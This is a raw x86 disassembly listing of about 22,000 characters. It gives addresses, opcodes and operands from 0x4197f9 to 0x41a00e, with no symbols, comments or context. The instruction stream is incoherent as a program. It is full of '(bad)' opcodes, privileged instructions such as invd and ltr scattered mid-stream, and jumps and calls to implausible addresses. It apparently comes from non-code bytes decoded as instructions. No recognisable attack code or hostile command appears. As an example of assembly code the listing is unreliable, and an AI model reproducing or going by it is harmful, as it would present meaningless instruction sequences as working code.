  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
